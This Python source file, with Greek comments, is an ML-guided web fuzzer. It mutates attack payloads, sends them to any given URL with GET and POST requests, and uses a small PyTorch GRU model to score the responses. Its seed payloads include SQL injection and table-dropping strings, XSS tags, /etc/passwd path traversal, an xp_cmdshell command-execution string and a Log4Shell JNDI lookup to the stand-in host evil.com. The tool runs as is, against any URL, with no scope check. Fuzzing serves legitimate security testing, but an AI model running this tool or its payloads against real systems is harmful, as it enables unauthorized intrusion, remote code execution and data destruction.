import requests
import random
import time
import string
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# -------- PyTorch imports και μοντέλο ----------
import torch
import torch.nn as nn
import torch.optim as optim

# Device configuration
DEVICE = torch.device("cuda" if torch.cuda.is_available() else "cpu")

class CharRNN(nn.Module):
    def __init__(self, vocab_size, embed_size=32, hidden_size=64, num_layers=1):
        super(CharRNN, self).__init__()
        self.embedding = nn.Embedding(vocab_size, embed_size)
        self.rnn = nn.GRU(embed_size, hidden_size, num_layers, batch_first=True)
        self.fc = nn.Linear(hidden_size, 1)  # output score regression

    def forward(self, x):
        embedded = self.embedding(x)        # shape: [batch_size, seq_len, embed_size]
        out, _ = self.rnn(embedded)         # shape: [batch_size, seq_len, hidden_size]
        out = out[:, -1, :].clone()         
        out = self.fc(out)                  # shape: [batch_size, 1]
        return out

class AdaptiveFuzzer:
    def __init__(self, target_url, max_iterations=20, delay=1, max_workers=5,
                 headers=None, cookies=None, proxies=None, debug_proxy=False):
        self.target_url = target_url
        self.max_iterations = max_iterations
        self.delay = delay
        self.max_workers = max_workers
        self.debug_proxy = debug_proxy

        self.headers = headers or {'User-Agent': 'AdaptiveFuzzer/1.0'}
        self.cookies = cookies or {}
        self.proxies = proxies or {}

        self.lock = threading.Lock()

        # Αρχικά seed payloads, πιο πλούσια
        self.seed_payloads = [
            "' OR 1=1 --",
            "<script>alert(1)</script>",
            "../etc/passwd",
            "%00",
            "admin'--",
            "'; DROP TABLE users;--",
            "' OR 'x'='x",
            "${jndi:ldap://evil.com/a}",
            "'; exec xp_cmdshell('dir');--",
            "<img src=x onerror=alert(1)>",
        ]

        self.corpus = self.seed_payloads.copy()
        self.history = {}  # payload -> score

        # Keywords για αξιολόγηση απόκρισης
        self.error_indicators = [
            "error", "exception", "sql", "alert", "unauthorized", "forbidden",
            "syntax", "traceback", "warning", "fail", "not found"
        ]

        # Char vocabulary για το μοντέλο
        self.chars = sorted(list(set(''.join(self.corpus) + string.printable)))
        self.char2idx = {c:i+1 for i,c in enumerate(self.chars)}  # 0 reserved for padding
        self.idx2char = {i:c for c,i in self.char2idx.items()}
        self.vocab_size = len(self.char2idx) + 1

        # Initialize the model
        self.model = CharRNN(self.vocab_size).to(DEVICE)
        self.optimizer = optim.Adam(self.model.parameters(), lr=0.005)
        self.criterion = nn.MSELoss()

        # Store training examples: list of (tensor_input, score)
        self.train_data = []

    def encode_payload(self, payload, max_len=50):
        # Converts string payload to tensor of indices (padded)
        indices = [self.char2idx.get(c, 0) for c in payload[:max_len]]
        if len(indices) < max_len:
            indices += [0] * (max_len - len(indices))
        return torch.tensor(indices, dtype=torch.long, device=DEVICE)

    def mutate(self, payload):
        """Πιο εξελιγμένη μετάλλαξη: εισαγωγή, διαγραφή, αντικατάσταση χαρακτήρων"""
        actions = ['insert', 'delete', 'replace', 'swap']
        action = random.choice(actions)
        chars = list(payload)
        length = len(chars)

        if length == 0:
            # Αν το payload άδειο, απλά προσθέτω τυχαίο char
            return random.choice(string.printable)

        if action == 'insert':
            pos = random.randint(0, length)
            char = random.choice(string.printable)
            chars.insert(pos, char)
        elif action == 'delete' and length > 1:
            pos = random.randint(0, length - 1)
            chars.pop(pos)
        elif action == 'replace':
            pos = random.randint(0, length - 1)
            chars[pos] = random.choice(string.printable)
        elif action == 'swap' and length > 1:
            pos1, pos2 = random.sample(range(length), 2)
            chars[pos1], chars[pos2] = chars[pos2], chars[pos1]

        return "".join(chars)

    def weighted_choice(self, items, weights):
        """Επιλογή με βάση βάρη"""
        total = sum(weights)
        r = random.uniform(0, total)
        upto = 0
        for i, w in zip(items, weights):
            if upto + w >= r:
                return i
            upto += w
        return items[-1]

    def train_model(self, epochs=1):
        if not self.train_data:
            return

        torch.autograd.set_detect_anomaly(True)
        self.model.train()
        batch_size = 12

        for epoch in range(epochs):
            random.shuffle(self.train_data)
            for i in range(0, len(self.train_data), batch_size):
                batch = self.train_data[i:i+batch_size]
                inputs = torch.stack([x[0] for x in batch]).to(DEVICE)
                targets = torch.tensor([x[1] for x in batch], dtype=torch.float32, device=DEVICE).unsqueeze(1)

                self.optimizer.zero_grad(set_to_none=True)
                outputs = self.model(inputs)
                loss = self.criterion(outputs, targets)
                loss.backward() 
                self.optimizer.step()

            print(f"Epoch {epoch+1}/{epochs} completed")

    def predict_score(self, payload):
        """Πρόβλεψη score από το μοντέλο"""
        self.model.eval()
        with torch.no_grad():
            x = self.encode_payload(payload).unsqueeze(0)  # batch 1
            pred = self.model(x)
            return pred.item()

    def select_payloads_ml(self):
        """
        ML-based επιλογή payloads προς μετάλλαξη.
        Χρησιμοποιεί το μοντέλο για πρόβλεψη score και history για feedback.
        """
        # Προσθέτουμε στο vocab chars από το corpus αν νέοι
        new_chars = set(''.join(self.corpus)) - set(self.chars)
        if new_chars:
            for c in new_chars:
                self.chars.append(c)
                self.char2idx[c] = len(self.char2idx) + 1
                self.idx2char[self.char2idx[c]] = c
            self.vocab_size = len(self.char2idx) + 1

        # Υπολογισμός score (μοντέλο + history)
        items = list(set(self.corpus))
        pred_scores = []
        for p in items:
            ml_score = self.predict_score(p)
            hist_score = self.history.get(p, 0)
            combined = 0.7 * ml_score + 0.3 * hist_score
            pred_scores.append(max(combined, 0.001))  # >0

        # Επιλογή με βαρύτητα στα predicted scores
        selected = []
        for _ in range(min(len(items), 10)):
            choice = self.weighted_choice(items, pred_scores)
            selected.append(choice)

        return list(set(selected))

    def test_payload(self, payload):
        """
        Δοκιμάζει το payload σε GET ή POST (τυχαία επιλεγμένα).
        Στέλνει JSON payload στο POST.
        Επιστρέφει βαθμολογία ενδιαφέροντος.
        """
        try:
            method = random.choice(['GET', 'POST'])
            if method == 'GET':
                params = {"input": payload}
                r = requests.get(self.target_url,
                                 params=params,
                                 headers=self.headers,
                                 cookies=self.cookies,
                                 proxies=self.proxies,
                                 timeout=5)
                content = r.text.lower()
            else:
                data = {"input": payload}
                r = requests.post(self.target_url,
                                  json=data,
                                  headers=self.headers,
                                  cookies=self.cookies,
                                  proxies=self.proxies,
                                  timeout=5)
                content = r.text.lower()

            if self.debug_proxy:
                print(f"[DEBUG] {method} {r.url if method=='GET' else self.target_url}")
                print(f"[DEBUG] Status: {r.status_code}")
                print(f"[DEBUG] Payload: {payload}")
                print(f"[DEBUG] Response snippet: {content[:200]}\n")

            score = 0
            for keyword in self.error_indicators:
                if keyword in content:
                    score += 1

            # Bonus score αν HTTP status είναι 4xx ή 5xx
            if 400 <= r.status_code < 600:
                score += 1

            return score
        except requests.RequestException as e:
            if self.debug_proxy:
                print(f"[DEBUG] Request failed: {e}")
            return 0

    def evolve(self):
        """Εξελίσσει το corpus μέσω μετάλλαξης με ML-based επιλογή payloads"""
        new_payloads = []
        selected_payloads = self.select_payloads_ml()
        for p in selected_payloads:
            for _ in range(random.randint(2, 3)):
                mutated = self.mutate(p)
                new_payloads.append(mutated)

        with self.lock:
            self.corpus.extend(new_payloads)

    def run_iteration_worker(self, payload):
        if payload in self.history:
            return None

        score = self.test_payload(payload)
        with self.lock:
            self.history[payload] = score
            tensor_input = self.encode_payload(payload)
            self.train_data.append((tensor_input, float(score)))
            if len(self.train_data) > 500:
                self.train_data = self.train_data[-500:]
        if score > 0:
            return (payload, score)
        return None

    def run(self):
        print(f"Starting Adaptive Fuzzer against: {self.target_url}\n")
        for i in range(self.max_iterations):
            print(f"=== Iteration {i+1}/{self.max_iterations} ===")
            scored = []

            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {executor.submit(self.run_iteration_worker, p): p for p in self.corpus}
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        payload, score = result
                        print(f"[+] Interesting payload (score {score}): {payload}")
                        scored.append(payload)

            if not scored:
                print("No interesting payloads found this iteration. Stopping early.\n")
                break

            with self.lock:
                self.corpus = scored

            # Εκπαίδευση εδώ, ΜΙΑ φορά ανά iteration
            self.train_model(epochs=1)

            self.evolve()
            time.sleep(self.delay)

        print("\nFuzzing complete. Summary of interesting payloads:")
        for payload, score in sorted(self.history.items(), key=lambda x: -x[1]):
            if score > 0:
                print(f"Score {score}: {payload}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Adaptive Fuzzing Payload Generator & Tester with Deep Learning")
    parser.add_argument("url", help="Target URL to fuzz (supports GET and POST)")
    parser.add_argument("--iterations", type=int, default=20, help="Max iterations (default: 20)")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between iterations in seconds (default: 1.0)")
    parser.add_argument("--threads", type=int, default=5, help="Number of parallel threads (default: 5)")
    parser.add_argument("--debug-proxy", action="store_true", help="Enable proxy debug output")
    parser.add_argument("--proxy", type=str, default=None, help="HTTP proxy URL (http://host:port)")
    parser.add_argument("--cookie", action="append", help="Cookies (format: key=value)", default=[])
    parser.add_argument("--header", action="append", help="Headers (format: Key: Value)", default=[])

    args = parser.parse_args()

    # Parse cookies and headers
    cookies = {}
    for c in args.cookie:
        if '=' in c:
            k,v = c.split('=',1)
            cookies[k.strip()] = v.strip()

    headers = {'User-Agent': 'AdaptiveFuzzer/1.0'}
    for h in args.header:
        if ':' in h:
            k,v = h.split(':',1)
            headers[k.strip()] = v.strip()

    proxies = {}
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy,
        }

    fuzzer = AdaptiveFuzzer(
        target_url=args.url,
        max_iterations=args.iterations,
        delay=args.delay,
        max_workers=args.threads,
        headers=headers,
        cookies=cookies,
        proxies=proxies,
        debug_proxy=args.debug_proxy,
    )

    fuzzer.run()
